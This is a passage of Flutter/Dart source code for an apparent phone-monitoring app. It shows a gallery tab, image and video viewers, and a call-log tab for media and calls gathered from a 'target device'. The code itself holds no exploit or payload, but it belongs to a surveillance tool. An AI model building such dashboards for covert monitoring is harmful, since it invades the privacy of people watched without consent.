                if (images > 0) _statChip('📷 $images', NoxColors.icyBlue),
                if (videos > 0) ...[const SizedBox(width: 6), _statChip('🎬 $videos', NoxColors.peachAccent)],
                const Spacer(),
                IconButton(
                  icon: Icon(_gridView ? Icons.list_rounded : Icons.grid_view_rounded, color: NoxColors.dimGray, size: 22),
                  onPressed: () => setState(() => _gridView = !_gridView),
                ),
              ]),
            ),
            // File list or grid
            Expanded(child: _gridView
              ? GridView.builder(
                  physics: const AlwaysScrollableScrollPhysics(),
                  padding: const EdgeInsets.symmetric(horizontal: 8),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 3, crossAxisSpacing: 3, mainAxisSpacing: 3),
                  itemCount: items.length,
                  itemBuilder: (context, i) => _buildGridTile(context, items[i]),
                )
              : ListView.builder(
                  physics: const AlwaysScrollableScrollPhysics(),
                  padding: const EdgeInsets.symmetric(horizontal: 12),
                  itemCount: items.length,
                  itemBuilder: (context, i) => _buildListItem(context, items[i]),
                ),
            ),
          ]),
        );
      },
    );
  }

  Widget _statChip(String text, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
      decoration: BoxDecoration(color: color.withValues(alpha: 0.15), borderRadius: BorderRadius.circular(8)),
      child: Text(text, style: TextStyle(color: color, fontSize: 11, fontWeight: FontWeight.w600)),
    );
  }

  Widget _buildGridTile(BuildContext context, Map<String, dynamic> it) {
    final id = _field(it, ['id']);
    final mime = _field(it, ['mimeType', 'mime', 'type']);
    final name = _field(it, ['fileName', 'name'], 'file');
    final isImage = mime.startsWith('image');
    final isVideo = mime.startsWith('video');
    final hasUpload = (it['storageKey'] ?? it['uploadedAt'] ?? '').toString().isNotEmpty;

    return GestureDetector(
      onTap: id.isEmpty ? null : () => _openFile(context, id, name, isImage, isVideo, hasUpload),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(4),
        child: Container(
          color: const Color(0xFF1A2530),
          child: Stack(fit: StackFit.expand, children: [
            // Try to load thumbnail from server
            if (isImage && hasUpload && id.isNotEmpty)
              Consumer(builder: (ctx, ref, _) {
                final bytes = ref.watch(galleryBytesProvider(id));
                return bytes.when(
                  loading: () => _gridFallback(name, isImage, isVideo),
                  error: (_, __) => _gridFallback(name, isImage, isVideo),
                  data: (b) => b.isEmpty ? _gridFallback(name, isImage, isVideo)
                    : Image.memory(b, fit: BoxFit.cover, width: double.infinity, height: double.infinity),
                );
              })
            else
              _gridFallback(name, isImage, isVideo),
            // Video play overlay
            if (isVideo) const Center(child: Icon(Icons.play_circle_fill, color: Colors.white70, size: 32)),
            // File name at bottom
            Positioned(left: 0, right: 0, bottom: 0, child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 3),
              color: Colors.black54,
              child: Text(name, style: const TextStyle(color: Colors.white70, fontSize: 8),
                maxLines: 1, overflow: TextOverflow.ellipsis),
            )),
          ]),
        ),
      ),
    );
  }

  Widget _gridFallback(String name, bool isImage, bool isVideo) {
    final ext = name.contains('.') ? name.split('.').last.toUpperCase() : '';
    return Container(
      color: const Color(0xFF1A2530),
      child: Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
        Icon(isImage ? Icons.image_rounded : isVideo ? Icons.videocam_rounded : Icons.insert_drive_file_rounded,
          color: isImage ? const Color(0xFF4FC3F7) : isVideo ? const Color(0xFFFF8A65) : NoxColors.mistGray, size: 30),
        if (ext.isNotEmpty) ...[
          const SizedBox(height: 2),
          Text(ext, style: TextStyle(
            color: isImage ? const Color(0xFF4FC3F7) : isVideo ? const Color(0xFFFF8A65) : NoxColors.dimGray,
            fontSize: 10, fontWeight: FontWeight.w700)),
        ],
      ])),
    );
  }

  Widget _buildListItem(BuildContext context, Map<String, dynamic> it) {
    final id = _field(it, ['id']);
    final mime = _field(it, ['mimeType', 'mime', 'type']);
    final name = _field(it, ['fileName', 'name'], 'file');
    final isImage = mime.startsWith('image');
    final isVideo = mime.startsWith('video');
    final hasUpload = (it['storageKey'] ?? it['uploadedAt'] ?? '').toString().isNotEmpty;
    final size = int.tryParse(_field(it, ['fileSize', 'size'], '0')) ?? 0;
    final t = _tsOf(it, ['takenAt', 'createdAt']);

    return InkWell(
      onTap: id.isEmpty ? null : () => _openFile(context, id, name, isImage, isVideo, hasUpload),
      child: Padding(
        padding: const EdgeInsets.symmetric(vertical: 8),
        child: Row(children: [
          // Icon/thumbnail
          Container(
            width: 48, height: 48,
            decoration: BoxDecoration(
              color: const Color(0xFF1A2530), borderRadius: BorderRadius.circular(8)),
            child: Center(child: Icon(
              isImage ? Icons.image_rounded : isVideo ? Icons.videocam_rounded : Icons.insert_drive_file_rounded,
              color: isImage ? const Color(0xFF4FC3F7) : isVideo ? const Color(0xFFFF8A65) : NoxColors.mistGray,
              size: 26)),
          ),
          const SizedBox(width: 12),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(name, style: const TextStyle(color: Color(0xFFE9EDEF), fontSize: 14),
              maxLines: 1, overflow: TextOverflow.ellipsis),
            const SizedBox(height: 2),
            Row(children: [
              Text(formatBytes(size), style: NoxTypography.caption.copyWith(fontSize: 11)),
              const SizedBox(width: 8),
              Text(mime, style: NoxTypography.caption.copyWith(fontSize: 11)),
              if (t != null) ...[
                const SizedBox(width: 8),
                Text(_activityTime(t), style: NoxTypography.caption.copyWith(fontSize: 11)),
              ],
            ]),
          ])),
          // Status icon
          Icon(hasUpload ? Icons.cloud_done_rounded : Icons.cloud_off_rounded,
            size: 18, color: hasUpload ? NoxColors.onlineGreen : NoxColors.dimGray),
        ]),
      ),
    );
  }

  void _openFile(BuildContext context, String id, String name, bool isImage, bool isVideo, bool hasUpload) {
    if (!hasUpload) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        content: Text('$name — file not uploaded from target device yet'),
        backgroundColor: NoxColors.elevatedSurface,
      ));
      return;
    }
    if (isImage) {
      Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _FullScreenImageViewer(itemId: id, name: name)));
    } else if (isVideo) {
      Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _FullScreenVideoPlayer(itemId: id, name: name)));
    }
  }
}

// Full-screen image viewer
class _FullScreenImageViewer extends ConsumerWidget {
  final String itemId;
  final String name;
  const _FullScreenImageViewer({required this.itemId, required this.name});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final bytes = ref.watch(galleryBytesProvider(itemId));

    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: Text(name, style: const TextStyle(color: Colors.white, fontSize: 14),
          overflow: TextOverflow.ellipsis),
        leading: IconButton(icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context)),
      ),
      body: bytes.when(
        loading: () => const Center(child: CircularProgressIndicator(color: NoxColors.lavenderLight)),
        error: (e, _) => Center(child: Text('Couldn\'t load image',
          style: TextStyle(color: NoxColors.offlineRed))),
        data: (b) => b.isEmpty
            ? const Center(child: Text('Image not uploaded yet', style: TextStyle(color: NoxColors.mistGray)))
            : InteractiveViewer(
                minScale: 0.5, maxScale: 5.0,
                child: Center(child: Image.memory(b, fit: BoxFit.contain)),
              ),
      ),
    );
  }
}

// Full-screen video player — downloads to temp file then plays
class _FullScreenVideoPlayer extends ConsumerStatefulWidget {
  final String itemId;
  final String name;
  const _FullScreenVideoPlayer({required this.itemId, required this.name});

  @override
  ConsumerState<_FullScreenVideoPlayer> createState() => _FullScreenVideoPlayerState();
}

class _FullScreenVideoPlayerState extends ConsumerState<_FullScreenVideoPlayer> {
  VideoPlayerController? _controller;
  bool _loading = true;
  String? _error;

  @override
  void initState() {
    super.initState();
    _loadVideo();
  }

  Future<void> _loadVideo() async {
    try {
      final api = ref.read(apiClientProvider);
      final dir = await getTemporaryDirectory();
      final ext = widget.name.contains('.') ? widget.name.split('.').last : 'mp4';
      final path = '${dir.path}/nox_video_${widget.itemId}.$ext';

      final file = File(path);
      if (!file.existsSync()) {
        await api.downloadGalleryBinary(widget.itemId, path);
      }

      final controller = VideoPlayerController.file(file);
      await controller.initialize();
      controller.play();

      if (mounted) {
        setState(() {
          _controller = controller;
          _loading = false;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _error = 'Couldn\'t load video: $e';
          _loading = false;
        });
      }
    }
  }

  @override
  void dispose() {
    _controller?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: Text(widget.name, style: const TextStyle(color: Colors.white, fontSize: 14),
          overflow: TextOverflow.ellipsis),
        leading: IconButton(icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context)),
      ),
      body: _loading
          ? const Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
              CircularProgressIndicator(color: NoxColors.lavenderLight),
              SizedBox(height: 16),
              Text('Downloading video...', style: TextStyle(color: NoxColors.moonlightSilver)),
            ]))
          : _error != null
              ? Center(child: Text(_error!, style: const TextStyle(color: NoxColors.offlineRed)))
              : _controller != null
                  ? GestureDetector(
                      onTap: () {
                        setState(() {
                          _controller!.value.isPlaying ? _controller!.pause() : _controller!.play();
                        });
                      },
                      child: Stack(children: [
                        Center(child: AspectRatio(
                          aspectRatio: _controller!.value.aspectRatio,
                          child: VideoPlayer(_controller!),
                        )),
                        if (!_controller!.value.isPlaying)
                          const Center(child: Icon(Icons.play_circle_fill, color: Colors.white70, size: 64)),
                        Positioned(bottom: 0, left: 0, right: 0,
                          child: VideoProgressIndicator(_controller!, allowScrubbing: true,
                            colors: const VideoProgressColors(
                              playedColor: NoxColors.lavenderPrimary,
                              bufferedColor: NoxColors.dimGray,
                              backgroundColor: NoxColors.elevatedSurface,
                            ),
                          ),
                        ),
                      ]),
                    )
                  : const SizedBox.shrink(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// 6. CALLS TAB
// ═══════════════════════════════════════════════════════════════
class _CallsTab extends ConsumerWidget {
  final String deviceId;
  const _CallsTab({required this.deviceId});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final provider = callLogsProvider(deviceId);
    final async = ref.watch(provider);

    return async.when(
      skipLoadingOnRefresh: true,
      loading: () => const Center(child: NoxLoadingSpinner(message: 'Loading...')),
      error: (e, _) => NoxErrorState(
        message: 'Couldn\'t load call logs', details: errorMessage(e),
        onRetry: () => ref.invalidate(provider),
      ),
      data: (rows) {
        if (rows.isEmpty) {
          return RefreshIndicator(
            color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
            onRefresh: () async { ref.invalidate(provider); try { await ref.read(provider.future); } catch (_) {} },
            child: ListView(physics: const AlwaysScrollableScrollPhysics(), children: const [
              SizedBox(height: 80),
              NoxEmptyState(icon: Icons.call_rounded, title: 'No call logs yet',
                subtitle: 'Calls appear once Call Log access is granted on target.'),
            ]),
          );
        }
        return RefreshIndicator(
          color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
          onRefresh: () async { ref.invalidate(provider); try { await ref.read(provider.future); } catch (_) {} },
          child: ListView.builder(
            physics: const AlwaysScrollableScrollPhysics(),
            padding: const EdgeInsets.all(NoxSpacing.lg),
            itemCount: rows.length,
            itemBuilder: (context, i) {
              final r = rows[i];
              final number = _field(r, ['phoneNumber', 'number']);
              final contact = _field(r, ['contactName', 'name'], number);
              final type = _field(r, ['callType', 'type']);
              final dur = int.tryParse(_field(r, ['durationSec', 'duration'], '0')) ?? 0;
              final t = _tsOf(r, ['timestamp', 'occurredAt', 'createdAt']);
              final tl = type.toLowerCase();
              final icon = tl.contains('miss') ? Icons.call_missed_rounded
                  : tl.contains('out') ? Icons.call_made_rounded
                  : Icons.call_received_rounded;
              final color = tl.contains('miss') ? NoxColors.offlineRed
                  : tl.contains('out') ? NoxColors.icyBlue
                  : NoxColors.onlineGreen;

              return Padding(
                padding: const EdgeInsets.only(bottom: NoxSpacing.sm),
                child: NoxCard(
                  variant: NoxCardVariant.glass,
                  padding: const EdgeInsets.all(NoxSpacing.md),
                  child: Row(children: [
                    Container(
                      width: 42, height: 42,
                      decoration: BoxDecoration(
                        color: color.withValues(alpha: 0.12), borderRadius: BorderRadius.circular(12)),
                      child: Center(child: Icon(icon, size: 22, color: color)),
                    ),
                    const SizedBox(width: NoxSpacing.md),
                    Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                      Text(contact, style: NoxTypography.subtitle.copyWith(
                        color: NoxColors.pureWhite, fontWeight: FontWeight.w600, fontSize: 14),
                        maxLines: 1, overflow: TextOverflow.ellipsis),
                      const SizedBox(height: 2),
                      Row(children: [
                        if (number != contact) ...[
                          Text(number, style: NoxTypography.caption),
                          const SizedBox(width: 8),
                        ],
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 1),
                          decoration: BoxDecoration(
                            color: color.withValues(alpha: 0.15), borderRadius: BorderRadius.circular(4)),
                          child: Text(type, style: NoxTypography.caption.copyWith(color: color, fontSize: 10)),
                        ),
                      ]),
                    ])),
                    Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
                      if (t != null) Text(_activityTime(t), style: NoxTypography.caption.copyWith(fontSize: 11)),
                      if (dur > 0) ...[
                        const SizedBox(height: 2),
                        Text(_fmtDuration(dur * 1000), style: NoxTypography.caption.copyWith(
                          color: NoxColors.icyBlue, fontWeight: FontWeight.w600)),
                      ],
                    ]),
                  ]),
                ),
              );
            },
          ),
        );
      },
    );
  }
}
